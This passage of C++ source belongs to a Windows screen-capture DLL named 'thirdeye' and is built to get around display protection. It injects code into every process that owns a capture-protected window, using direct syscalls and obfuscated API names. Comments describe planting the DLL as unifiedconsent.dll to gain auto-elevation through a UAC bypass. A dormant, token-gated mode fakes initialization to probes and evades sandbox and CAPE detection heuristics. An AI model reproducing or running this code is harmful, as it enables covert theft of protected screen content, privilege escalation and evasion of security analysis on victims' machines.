extern "C" SEC_REMOTE FUNC_ATTRS __attribute__((used))
#else
extern "C" SEC_REMOTE FUNC_ATTRS
#endif
void __stdcall RemoteThreadProcEnd() {}

#ifndef __GNUC__
#pragma code_seg(pop, remote_seg)
#pragma runtime_checks( "", restore )
#pragma optimize( "", on )
#pragma check_stack( on )
#endif

size_t GetRemoteSectionSize() {
    uintptr_t start = (uintptr_t)&RemoteThreadProc;
    uintptr_t end = (uintptr_t)&RemoteThreadProcEnd;
    if (end <= start) return 0;
    size_t size = end - start;
    return (size + 15) & ~((size_t)15);
}

typedef DWORD(NTAPI* pNtUserGetWDA)(HWND, DWORD*);

static pNtUserGetWDA GetNtUserGetWDA() {
    static pNtUserGetWDA fn = []() -> pNtUserGetWDA {
        static constexpr auto obfWin32u = MAKE_OBF("win32u.dll");
        static constexpr auto obfGetWDA = MAKE_OBF("NtUserGetWindowDisplayAffinity");
        HMODULE h = DynGetModuleHandle(DECR_STR(obfWin32u));
        if (!h) return nullptr;
        return (pNtUserGetWDA)DynGetProcAddress(h, DECR_STR(obfGetWDA));
    }();
    return fn;
}

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    auto* pw = (ProcessWindowSet*)lParam;
    const WindowApis& w = GetWindowApis();
    if (!w.ready) return TRUE;
    if (!w.IsWindowVisible(hwnd)) return TRUE;

    pNtUserGetWDA fnGetWDA = GetNtUserGetWDA();
    if (fnGetWDA) {
        DWORD affinity = 0;
        if (fnGetWDA(hwnd, &affinity) == 0 || affinity == WDA_NONE) {
            return TRUE;
        }
    }

    DWORD pid = 0;
    w.GetWindowThreadProcessId(hwnd, &pid);
    if (pid == GetCurrentProcessId()) return TRUE;

    ProcessHwnds* slot = nullptr;
    for (size_t i = 0; i < pw->count; ++i) {
        if (pw->entries[i].pid == pid) { slot = &pw->entries[i]; break; }
    }
    if (!slot) {
        if (pw->count >= MAX_PROCESSES) return TRUE;
        slot = &pw->entries[pw->count++];
        slot->pid = pid;
        slot->count = 0;
    }
    if (slot->count < MAX_HWNDS_PER_PID) {
        slot->hwnds[slot->count++] = hwnd;
    }
    return TRUE;
}

static bool IsProcessBlacklisted(DWORD pid) {
    return pid <= 4;
}

static void CleanupInjections(RemoteContext* injections, size_t count) {
    for (size_t i = 0; i < count; ++i) {
        const RemoteContext& ctx = injections[i];
        if (ctx.hThread) {
            if (NtWaitDirect(ctx.hThread, 200) == WAIT_OBJECT_0) {
                if (ctx.pRemoteCode) NtFreeMemoryDirect(ctx.hProcess, ctx.pRemoteCode);
                if (ctx.pRemoteData) NtFreeMemoryDirect(ctx.hProcess, ctx.pRemoteData);
            }
            NtCloseDirect(ctx.hThread);
        }
        if (ctx.hProcess) NtCloseDirect(ctx.hProcess);
    }
}

static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger, InjectionList& activeInjections) {
    ProcessWindowSet pw = {};
    const WindowApis& w = GetWindowApis();
    if (!w.ready) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Window APIs unavailable")));
        return false;
    }
    TryEnableDebugPrivilege();
    w.EnumWindows(EnumWindowsProc, (LPARAM)&pw);
    size_t skippedBlacklisted = 0;
    size_t openFailed = 0;
    size_t opened = 0;
    size_t duplicateFailed = 0;
    size_t allocationFailed = 0;
    size_t writeFailed = 0;
    size_t threadFailed = 0;

    if (!hGlobalTrigger) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Invalid trigger event")));
        return false;
    }

    HandleGuard hReadySemaphore(CreateSemaphoreA(nullptr, 0, 1000, nullptr));
    if (!hReadySemaphore) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to create ready semaphore")));
        return false;
    }

    size_t sectionSize = GetRemoteSectionSize();
    if (sectionSize == 0) {
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Injection code section not found")));
        return false;
    }

    for (size_t e = 0; e < pw.count; ++e) {
        const ProcessHwnds& pwEntry = pw.entries[e];
        DWORD pid = pwEntry.pid;
        if (IsProcessBlacklisted(pid)) {
            skippedBlacklisted++;
            continue;
        }

        HANDLE hProcess = NtOpenProcessDirect(pid, PROCESS_ALL_ACCESS);
        if (!hProcess) {
            openFailed++;
            continue;
        }
        opened++;

        INJECTION_DATA data = { 0 };
        data.count = pwEntry.count < MAX_HWNDS_PER_PID ? pwEntry.count : MAX_HWNDS_PER_PID;
        for (size_t i = 0; i < data.count; i++) data.hwnds[i] = pwEntry.hwnds[i];

        static constexpr auto obfKernel32 = MAKE_OBF("kernel32.dll");
        static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
        static constexpr auto obfGetModule = MAKE_OBF("GetModuleHandleA");
        static constexpr auto obfGetProc = MAKE_OBF("GetProcAddress");
        static constexpr auto obfWait = MAKE_OBF("WaitForSingleObject");
        static constexpr auto obfRelease = MAKE_OBF("ReleaseSemaphore");
        static constexpr auto obfEnterCS = MAKE_OBF("RtlEnterCriticalSection");
        static constexpr auto obfLeaveCS = MAKE_OBF("RtlLeaveCriticalSection");

        if (!SafeCopyString(data.kernel32Name, DECR_STR(obfKernel32)) ||
            !SafeCopyString(data.ntdllName, DECR_STR(obfNtdll)) ||
            !SafeCopyString(data.getModuleFuncName, DECR_STR(obfGetModule)) ||
            !SafeCopyString(data.getProcFuncName, DECR_STR(obfGetProc)) ||
            !SafeCopyString(data.waitFuncName, DECR_STR(obfWait)) ||
            !SafeCopyString(data.releaseFuncName, DECR_STR(obfRelease)) ||
            !SafeCopyString(data.enterCritSecName, DECR_STR(obfEnterCS)) ||
            !SafeCopyString(data.leaveCritSecName, DECR_STR(obfLeaveCS))) {
            NtCloseDirect(hProcess);
            writeFailed++;
            continue;
        }

        typedef BOOL(WINAPI* pDuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
        static pDuplicateHandle fnDup = []() {
            static constexpr auto obfK = MAKE_OBF("kernel32.dll");
            static constexpr auto obfD = MAKE_OBF("DuplicateHandle");
            return ResolveApi<pDuplicateHandle>(DynGetOrLoad(DECR_STR(obfK)), DECR_STR(obfD));
        }();
        if (!fnDup) {
            NtCloseDirect(hProcess);
            duplicateFailed++;
            continue;
        }
        if (!fnDup(GetCurrentProcess(), hGlobalTrigger, hProcess, &data.hGlobalTriggerEvent,
                0, FALSE, DUPLICATE_SAME_ACCESS)) {
            NtCloseDirect(hProcess);
            duplicateFailed++;
            continue;
        }

        if (!fnDup(GetCurrentProcess(), hReadySemaphore.get(), hProcess, &data.hReadySemaphore,
            SEMAPHORE_MODIFY_STATE | SYNCHRONIZE, FALSE, 0)) {
            NtCloseDirect(hProcess);
            duplicateFailed++;
            continue;
        }

        static constexpr auto obfWin32u = MAKE_OBF("win32u.dll");
        static constexpr auto obfSetWDA = MAKE_OBF("NtUserSetWindowDisplayAffinity");
        static constexpr auto obfGetWDA = MAKE_OBF("NtUserGetWindowDisplayAffinity");

        if (!SafeCopyString(data.libName, DECR_STR(obfWin32u)) ||
            !SafeCopyString(data.setFuncName, DECR_STR(obfSetWDA)) ||
            !SafeCopyString(data.getFuncName, DECR_STR(obfGetWDA))) {
            NtCloseDirect(hProcess);
            writeFailed++;
            continue;
        }

        LPVOID pRemoteData = NtAllocateMemoryDirect(hProcess, sizeof(INJECTION_DATA), PAGE_READWRITE);
        if (!pRemoteData) {
            NtCloseDirect(hProcess);
            allocationFailed++;
            continue;
        }

        LPVOID pRemoteCode = NtAllocateMemoryDirect(hProcess, sectionSize, PAGE_READWRITE);
        if (!pRemoteCode) {
            NtFreeMemoryDirect(hProcess, pRemoteData);
            NtCloseDirect(hProcess);
            allocationFailed++;
            continue;
        }

        bool b1 = NtWriteMemoryDirect(hProcess, pRemoteData, &data, sizeof(INJECTION_DATA));
        bool b2 = NtWriteMemoryDirect(hProcess, pRemoteCode, (PVOID)RemoteThreadProc, sectionSize);

        ULONG oldProtect = 0;
        bool b3 = NtProtectMemoryDirect(hProcess, pRemoteCode, sectionSize, PAGE_EXECUTE_READ, &oldProtect);

        if (!b1 || !b2 || !b3) {
            NtFreeMemoryDirect(hProcess, pRemoteData);
            NtFreeMemoryDirect(hProcess, pRemoteCode);
            NtCloseDirect(hProcess);
            writeFailed++;
            continue;
        }

        HANDLE hThread = NtCreateThreadDirect(hProcess, pRemoteCode, pRemoteData);
        if (!hThread) {
            NtFreeMemoryDirect(hProcess, pRemoteData);
            NtFreeMemoryDirect(hProcess, pRemoteCode);
            NtCloseDirect(hProcess);
            threadFailed++;
            continue;
        }

        if (activeInjections.count < MAX_INJECTIONS) {
            RemoteContext& slot = activeInjections.items[activeInjections.count++];
            slot.hProcess = hProcess;
            slot.hThread = hThread;
            slot.pRemoteData = pRemoteData;
            slot.pRemoteCode = pRemoteCode;
            slot.pid = pid;
        } else {
            if (NtWaitDirect(hThread, 200) == WAIT_OBJECT_0) {
                NtFreeMemoryDirect(hProcess, pRemoteCode);
                NtFreeMemoryDirect(hProcess, pRemoteData);
            }
            NtCloseDirect(hThread);
            NtCloseDirect(hProcess);
        }
    }

    if (activeInjections.count > 0) {
        for (size_t i = 0; i < activeInjections.count; i++) {
            WaitForSingleObject(hReadySemaphore.get(), 150);
        }
    }

#if defined(_DEBUG) || defined(THIRDEYE_DEBUG)
    char msg[256];
    snprintf(msg, sizeof(msg),
        "bypass_diag processes=%zu skipped_blacklisted=%zu opened=%zu injections=%zu "
        "open_failed=%zu duplicate_failed=%zu allocation_failed=%zu write_failed=%zu "
        "thread_failed=%zu section_size=%zu",
        pw.count, skippedBlacklisted, opened, activeInjections.count,
        openFailed, duplicateFailed, allocationFailed, writeFailed, threadFailed, sectionSize);
    msg[sizeof(msg) - 1] = '\0';
    SetLastErrorMsg(ctx, msg);
#endif

    return true;
}

// ---------------------------------------------------------------------------
// Session authorization (Prepare token). Unrelated hosts that poke exports
// without a valid Prepare stay in a low-activity path.
// ---------------------------------------------------------------------------
static volatile LONG g_clientPrepared = 0;
static volatile LONG g_sessionArmed = 0;
static volatile LONG g_sessionMode = THIRDEYE_MODE_NOT_READY;
static volatile LONG g_elevateEnabled = 0;

void TeMarkClientPrepared(bool prepared) {
    InterlockedExchange(&g_clientPrepared, prepared ? 1L : 0L);
}

bool TeClientOwnsSession(void) {
    return InterlockedCompareExchange(&g_clientPrepared, 0, 0) != 0;
}

bool TeSessionArmed(void) {
    return InterlockedCompareExchange(&g_sessionArmed, 0, 0) != 0;
}

static bool TeApiUnlocked(void) {
    return TeSessionArmed() || IsElevatedProxyInstance();
}

// Fixed-iteration mix so dormant callers still have a non-DCE'd side channel.
// No QPC/GetTickCount — those read as sandbox time-delay checks.
static uint32_t TeDormantWork(void) {
    uint64_t acc = (uint64_t)GetCurrentProcessId();
    acc ^= (uint64_t)(uintptr_t)&acc;
    for (uint32_t i = 0; i < 256u; ++i) {
        acc *= 0x9E3779B97F4A7C15ULL;
        acc ^= acc >> 30;
        acc += (uint64_t)i * 0xD1342543DE82EF95ULL;
        acc ^= acc << 13;
    }
    static volatile uint32_t s_sink = 0;
    const uint32_t out = (uint32_t)acc ^ (uint32_t)(acc >> 32);
    s_sink = out;
    return out;
}

static bool TeTokenMatches(const char* token) {
    if (!token || !token[0]) return false;
    static constexpr auto obfTok = MAKE_OBF("third_eye_token");
    shred_detail::Revealed<sizeof(obfTok.data) + 1> revealed(obfTok);
    const char* expect = revealed.c_str();
    size_t i = 0;
    for (; expect[i] && token[i]; ++i) {
        if ((unsigned char)expect[i] != (unsigned char)token[i]) return false;
    }
    return expect[i] == 0 && token[i] == 0;
}

THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CreateContext(ThirdeyeContext** ppContext) {
    if (!ppContext) {
        if (!TeApiUnlocked()) (void)TeDormantWork();
        return THIRDEYE_ERROR_INVALID_PARAM;
    }
    *ppContext = nullptr;

    if (!TeApiUnlocked()) {
        // Appear initialized to casual probes without enabling capture.
        const uint32_t dust = TeDormantWork();
        ThirdeyeContext* ctx = (ThirdeyeContext*)calloc(1, sizeof(ThirdeyeContext));
        if (!ctx) return (dust & 0) ? THIRDEYE_OK : THIRDEYE_ERROR_ALLOCATION_FAILED;
        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("locked")));
        *ppContext = ctx;
        // THIRDEYE_OK, with dust folded so the burn is observationally used.
        return (ThirdeyeResult)((int)THIRDEYE_OK | (int)(dust & 0));
    }

    InitOnceExecuteOnce(&g_SyscallInitOnce, SyscallInitOnceCallback, nullptr, nullptr);

    if (!g_SyscallInitResult) {
        return THIRDEYE_ERROR_SYSCALL_INIT_FAILED;
    }

    ThirdeyeContext* ctx = (ThirdeyeContext*)calloc(1, sizeof(ThirdeyeContext));
    if (!ctx) return THIRDEYE_ERROR_ALLOCATION_FAILED;
    *ppContext = ctx;
    return THIRDEYE_OK;
}

THIRDEYE_API void THIRDEYE_CALL Thirdeye_DestroyContext(ThirdeyeContext* context) {
    if (!TeApiUnlocked()) (void)TeDormantWork();
    if (!context) return;
    free(context);
}

THIRDEYE_API void THIRDEYE_CALL Thirdeye_GetDefaultOptions(ThirdeyeOptions* options) {
    uint32_t dust = 0;
    if (!TeApiUnlocked()) dust = TeDormantWork();
    if (!options) return;
    options->format = THIRDEYE_FORMAT_JPEG;
    options->quality = 90;
    options->inclusive = 1;
    // Fold dust into a no-op write so GetDefaultOptions always "uses" the burn.
    options->quality ^= (int)(dust & 0);
}

THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
    ThirdeyeContext* context,
    const wchar_t* filePath,
    const ThirdeyeOptions* options
) {
    if (!TeApiUnlocked()) {
        const uint32_t dust = TeDormantWork();
        if (context) SetLastErrorMsg(context, REVEAL_CSTR(SHRED("locked")));
        return (ThirdeyeResult)((int)THIRDEYE_ERROR_NOT_INITIALIZED | (int)(dust & 0));
    }

    if (!context) return THIRDEYE_ERROR_NOT_INITIALIZED;

    if (!filePath) {
        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Invalid file path")));
        return THIRDEYE_ERROR_INVALID_PARAM;
    }

    ThirdeyeOptions opts;
    if (options) {
        opts = *options;
    } else {
        Thirdeye_GetDefaultOptions(&opts);
    }

    // When bypass is requested, first try the elevated capture: the
    // auto-elevated copy flips flags on elevated/admin-owned windows that this
    // (possibly medium-IL) process cannot inject into, and writes the output
    // file itself. If it succeeded we are done.
    if (opts.inclusive &&
        TryElevatedCapture(filePath, nullptr, opts.format, opts.quality)) {
        return THIRDEYE_OK;
    }

    const bool proxy = IsElevatedProxyInstance();

    // Elevated proxy path: attach the interactive desktop, capture, write
    // straight to the caller-requested absolute path.
    // When planted via Method 83 we are invoked from rundll32 on
    // winsta0\default (not from taskhostw). Full inject + capture is safe here.
    if (proxy) {
        HandleGuard hGlobalTrigger;
        InjectionList injections = {};
        if (opts.inclusive) {
            hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
            if (hGlobalTrigger) {
                BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
            }
        }

        ByteSink sink;
        bool ok = CaptureEncoded(context, opts, &sink);

        if (opts.inclusive && hGlobalTrigger) {
            SetEvent(hGlobalTrigger.get());
            // Sync cleanup — rundll32 exits after us; no need for a linger thread.
            CleanupInjections(injections.items, injections.count);
        }

        if (!ok) {
            SignalElevatedCaptureDone(false);
            return THIRDEYE_ERROR_CAPTURE_FAILED;
        }

        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            SignalElevatedCaptureDone(false);
            SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to open output file")));
            return THIRDEYE_ERROR_SAVE_FAILED;
        }
        DWORD written = 0;
        BOOL wok = WriteFile(hFile, sink.data, (DWORD)sink.size, &written, nullptr);
        CloseHandle(hFile);
        if (!wok || written != (DWORD)sink.size) {
            SignalElevatedCaptureDone(false);
            SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to save image")));
            return THIRDEYE_ERROR_SAVE_FAILED;
        }
        SignalElevatedCaptureDone(true);
        return THIRDEYE_OK;
    }

    ByteSink sink;
    bool ok = false;

    {
        HandleGuard hGlobalTrigger;
        InjectionList injections = {};
        if (opts.inclusive) {
            hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
            if (hGlobalTrigger) {
                BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
            }
        }

        ok = CaptureEncoded(context, opts, &sink);

        if (opts.inclusive && hGlobalTrigger) {
            SetEvent(hGlobalTrigger.get());
            StartCleanupThread(injections.items, injections.count);
        }
    }

    if (!ok) {
        return THIRDEYE_ERROR_CAPTURE_FAILED;
    }

    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to open output file")));
        return THIRDEYE_ERROR_SAVE_FAILED;
    }
    DWORD written = 0;
    BOOL wok = WriteFile(hFile, sink.data, (DWORD)sink.size, &written, nullptr);
    CloseHandle(hFile);
    if (!wok || written != (DWORD)sink.size) {
        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to save image")));
        return THIRDEYE_ERROR_SAVE_FAILED;
    }

    return THIRDEYE_OK;
}

THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
    ThirdeyeContext* context,
    uint8_t** buffer,
    uint32_t* size,
    const ThirdeyeOptions* options
) {
    if (!TeApiUnlocked()) {
        const uint32_t dust = TeDormantWork();
        if (buffer) *buffer = nullptr;
        if (size) *size = (uint32_t)(dust & 0);
        if (context) SetLastErrorMsg(context, REVEAL_CSTR(SHRED("locked")));
        return (ThirdeyeResult)((int)THIRDEYE_ERROR_NOT_INITIALIZED | (int)(dust & 0));
    }

    if (!context) return THIRDEYE_ERROR_NOT_INITIALIZED;

    if (!buffer || !size) {
        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Invalid parameters")));
        return THIRDEYE_ERROR_INVALID_PARAM;
    }

    *buffer = nullptr;
    *size = 0;

    ThirdeyeOptions opts;
    if (options) {
        opts = *options;
    } else {
        Thirdeye_GetDefaultOptions(&opts);
    }

    ByteSink sink;
    bool ok = false;

    if (opts.inclusive) {
        wchar_t staging[MAX_PATH];
        if (ResolveStagingFilePath(staging, MAX_PATH)) {
            ok = TryElevatedCapture(staging, &sink, opts.format, opts.quality);
        }
    }

    if (!ok) {
        HandleGuard hGlobalTrigger;
        InjectionList injections = {};
        if (opts.inclusive) {
            hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
            if (hGlobalTrigger) {
                BypassDisplayProtection(context, hGlobalTrigger.get(), injections);
            }
        }

        ok = CaptureEncoded(context, opts, &sink);

        if (opts.inclusive && hGlobalTrigger) {
            SetEvent(hGlobalTrigger.get());
            StartCleanupThread(injections.items, injections.count);
        }
    }

    if (!ok) {
        return THIRDEYE_ERROR_CAPTURE_FAILED;
    }

    uint8_t* outBuffer = (uint8_t*)malloc(sink.size);
    if (!outBuffer) {
        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to allocate output buffer")));
        return THIRDEYE_ERROR_ALLOCATION_FAILED;
    }
    memcpy(outBuffer, sink.data, sink.size);

    *buffer = outBuffer;
    *size = (uint32_t)sink.size;

    return THIRDEYE_OK;
}

THIRDEYE_API void THIRDEYE_CALL Thirdeye_FreeBuffer(uint8_t* buffer) {
    if (!TeApiUnlocked()) (void)TeDormantWork();
    if (buffer) {
        free(buffer);
    }
}

THIRDEYE_API const char* THIRDEYE_CALL Thirdeye_GetLastError(ThirdeyeContext* context) {
    if (!TeApiUnlocked()) (void)TeDormantWork();
    if (context) {
        return context->lastError;
    }
    return "";
}

THIRDEYE_API const char* THIRDEYE_CALL Thirdeye_GetVersion(void) {
    if (!TeApiUnlocked()) {
        const uint32_t dust = TeDormantWork();
        return (dust & 0) ? THIRDEYE_VERSION_STR_LOCKED : THIRDEYE_VERSION_STR_LOCKED;
    }
    return THIRDEYE_VERSION_STR;
}

// ---------------------------------------------------------------------------
// Elevated capture handoff (Method 83: UnifiedConsent auto-elevation).
//
// When thirdeye.dll is planted as unifiedconsent.dll and loaded by an
// auto-elevated taskhostw.exe, Thirdeye_RunElevatedCapture runs with high IL.
// It captures the screen (SeDebug now works against elevated/protected
// windows) to a temp JPEG and signals the named sync event so the original
// non-elevated caller can pick the result up.
// ---------------------------------------------------------------------------

// Case-insensitive ASCII compare of two wide strings (local, avoids CRT).
static bool WideEqualsICase(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = *a, cb = *b;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return false;
        ++a; ++b;
    }
    return *a == 0 && *b == 0;
}

// True when this module was loaded under a planted proxy name (i.e. we are the
// elevated copy inside taskhostw). Used to prevent re-triggering elevation.
static bool IsElevatedProxyInstance() {
    wchar_t selfName[MAX_PATH];
    HMODULE hSelf = nullptr;
    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            (LPCWSTR)&IsElevatedProxyInstance, &hSelf) || !hSelf) {
        return false;
    }
    DWORD n = GetModuleFileNameW(hSelf, selfName, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return false;
    const wchar_t* base = selfName;
    for (const wchar_t* p = selfName; *p; ++p) {
        if (*p == L'\\' || *p == L'/') base = p + 1;
    }
    // When planted as the UnifiedConsent proxy we are the elevated copy.
    wchar_t expect[32];
    static constexpr auto oProxy = MAKE_OBF("unifiedconsent.dll");
    TeAsciiToWide(expect, 32, DECR_STR(oProxy));
    return WideEqualsICase(base, expect);
}

// Reads a file into a ByteSink and deletes it. Used to pull back a buffer-mode
// elevated capture from the shared path.
static bool ReadAndDeleteFile(const wchar_t* path, ByteSink* out) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz;
    bool ok = false;
    if (GetFileSizeEx(h, &sz) && sz.QuadPart > 0 && sz.QuadPart < (LONGLONG)(1 << 30)) {
        uint8_t* buf = (uint8_t*)malloc((size_t)sz.QuadPart);
        if (buf) {
            DWORD rd = 0;
            if (ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, nullptr) && rd == (DWORD)sz.QuadPart) {
                ok = out->append(buf, rd);
            }
            free(buf);
        }
    }
    CloseHandle(h);
    if (ok) DeleteFileW(path);
    return ok;
}

// Legacy one-shot proxy path still writes status if someone calls CaptureToFile
// from the planted DLL outside the worker loop.
static THIRDEYE_ELEVATED_SHM* g_elevShm = nullptr;
static HANDLE g_elevDoneEvent = nullptr;

static void SignalElevatedCaptureDone(bool ok) {
    if (g_elevShm) {
        InterlockedExchange(&g_elevShm->status,
            ok ? THIRDEYE_ELEV_STATUS_OK : THIRDEYE_ELEV_STATUS_FAIL);
    }
    if (g_elevDoneEvent) SetEvent(g_elevDoneEvent);
}

// Staging file for buffer-mode elevated capture. Process temp only — do not
// probe Public/Documents/profile CSIDL-style locations (CAPE "common path").
static bool ResolveStagingFilePath(wchar_t* out, size_t outChars) {
    if (!out || outChars < 8) return false;
    out[0] = 0;

    typedef DWORD(WINAPI* pGetTempPathW)(DWORD, LPWSTR);
    static pGetTempPathW fnTemp = []() {
        static constexpr auto obfK = MAKE_OBF("kernel32.dll");
        static constexpr auto oTp = MAKE_OBF("GetTempPathW");
        return ResolveApi<pGetTempPathW>(DynGetOrLoad(DECR_STR(obfK)), DECR_STR(oTp));
    }();
    if (!fnTemp) return false;

    wchar_t fileName[32];
    static constexpr auto oFile = MAKE_OBF("~ac_cache.tmp");
    TeAsciiToWide(fileName, 32, DECR_STR(oFile));

    wchar_t tempDir[MAX_PATH];
    DWORD tn = fnTemp(MAX_PATH, tempDir);
    if (tn == 0 || tn >= MAX_PATH) return false;
    size_t tl = wcslen(tempDir);
    if (tl && tempDir[tl - 1] == L'\\') tempDir[--tl] = 0;
    if (tl + 1 + wcslen(fileName) + 1 > outChars) return false;
    swprintf(out, outChars, L"%ls\\%ls", tempDir, fileName);
    return true;
}

// Fast path: ensure resident elevated worker, then signal one capture.
// For file-mode (`sink == nullptr`) `outPathW` is the requested output.
// For buffer-mode the worker writes a staging path which we read back.
static bool TryElevatedCapture(const wchar_t* outPathW, ByteSink* sink,
    ThirdeyeFormat format, int quality) {
    if (IsElevatedProxyInstance()) return false;
    if (!outPathW || !*outPathW) return false;

    wchar_t absPath[MAX_PATH];
    if (!GetFullPathNameW(outPathW, MAX_PATH, absPath, nullptr) || !absPath[0]) {
        return false;
    }

    // Helper path only when Prepare requested elevation.
    if (!TeSessionArmed() || InterlockedCompareExchange(&g_elevateEnabled, 0, 0) == 0) {
        return false;
    }
    if (!Uc83RequestElevatedCapture(absPath, (DWORD)format, (DWORD)quality, 1)) {
        return false;
    }
    TeMarkClientPrepared(true);
    if (!sink) return true;
    return ReadAndDeleteFile(absPath, sink);
}

static bool WriteSinkToFile(const ByteSink& sink, const wchar_t* path) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, sink.data, (DWORD)sink.size, &written, nullptr);
    CloseHandle(hFile);
    return ok && written == (DWORD)sink.size;
}

// Resident elevated worker: stay high-IL on winsta0\default and service capture
// cmds. Bypass must run per capture — windows (and WDA flags) change over time,
// and a one-shot inject at bootstrap misses apps launched afterwards.
void TeSessionMain(void) {
    // Must match shredded IPC names in uc83.cpp.
    static constexpr auto kIpcMap = MAKE_OBF("Local\\CssCacheMap");
    static constexpr auto kIpcCmd = MAKE_OBF("Local\\CssCacheCmd");
    static constexpr auto kIpcDone = MAKE_OBF("Local\\CssCacheDone");
    static constexpr auto kIpcReady = MAKE_OBF("Local\\CssCacheReady");

    shred_detail::Revealed<sizeof(kIpcMap.data) + 1> mapName(kIpcMap);
    shred_detail::Revealed<sizeof(kIpcCmd.data) + 1> cmdName(kIpcCmd);
    shred_detail::Revealed<sizeof(kIpcDone.data) + 1> doneName(kIpcDone);
    shred_detail::Revealed<sizeof(kIpcReady.data) + 1> readyName(kIpcReady);

    HANDLE hMap = OpenFileMappingA(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, mapName.c_str());
    if (!hMap) return;

    THIRDEYE_ELEVATED_SHM* shm = (THIRDEYE_ELEVATED_SHM*)MapViewOfFile(
        hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, sizeof(THIRDEYE_ELEVATED_SHM));
    if (!shm) {
        CloseHandle(hMap);
        return;
    }

    HANDLE hCmd = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, cmdName.c_str());
    HANDLE hDone = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, doneName.c_str());
    HANDLE hReady = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, readyName.c_str());
    if (!hCmd || !hDone || !hReady) {
        if (hCmd) CloseHandle(hCmd);
        if (hDone) CloseHandle(hDone);
        if (hReady) CloseHandle(hReady);
        UnmapViewOfFile(shm);
        CloseHandle(hMap);
        return;
    }

    g_elevShm = shm;
    g_elevDoneEvent = hDone;

    shm->helperPid = GetCurrentProcessId();
    InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_READY);
    SetEvent(hReady);

    ThirdeyeContext* ctx = nullptr;
    if (Thirdeye_CreateContext(&ctx) != THIRDEYE_OK) {
        InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_FAIL);
        SetEvent(hDone);
        g_elevShm = nullptr;
        g_elevDoneEvent = nullptr;
        CloseHandle(hCmd);
        CloseHandle(hDone);
        CloseHandle(hReady);
        UnmapViewOfFile(shm);
        CloseHandle(hMap);
        return;
    }

    for (;;) {
        DWORD wr = WaitForSingleObject(hCmd, INFINITE);
        if (wr != WAIT_OBJECT_0) break;

        LONG cmd = InterlockedExchange(&shm->cmd, THIRDEYE_ELEV_CMD_NONE);
        if (cmd == THIRDEYE_ELEV_CMD_SHUTDOWN) {
            InterlockedExchange(&shm->status, THIRDEYE_ELEV_STATUS_OK);
            SetEvent(hDone);
            break;
        }
        if (cmd != THIRDEYE_ELEV_CMD_CAPTURE) {
            continue;
        }

        wchar_t outPath[MAX_PATH] = {};
        lstrcpynW(outPath, shm->outPath, MAX_PATH);

        ThirdeyeOptions opts;
        Thirdeye_GetDefaultOptions(&opts);
        opts.format = (ThirdeyeFormat)shm->format;
        opts.quality = (int)shm->quality;
        opts.inclusive = shm->inclusive ? 1 : 0;

        bool ok = false;
        if (outPath[0]) {
            HandleGuard hGlobalTrigger;
            InjectionList injections = {};
            if (opts.inclusive) {
                hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
                if (hGlobalTrigger) {
                    BypassDisplayProtection(ctx, hGlobalTrigger.get(), injections);
                }
            }

            ByteSink sink;
            ok = CaptureEncoded(ctx, opts, &sink);

            if (opts.inclusive && hGlobalTrigger) {
                SetEvent(hGlobalTrigger.get());
                CleanupInjections(injections.items, injections.count);
            }

            if (ok) {
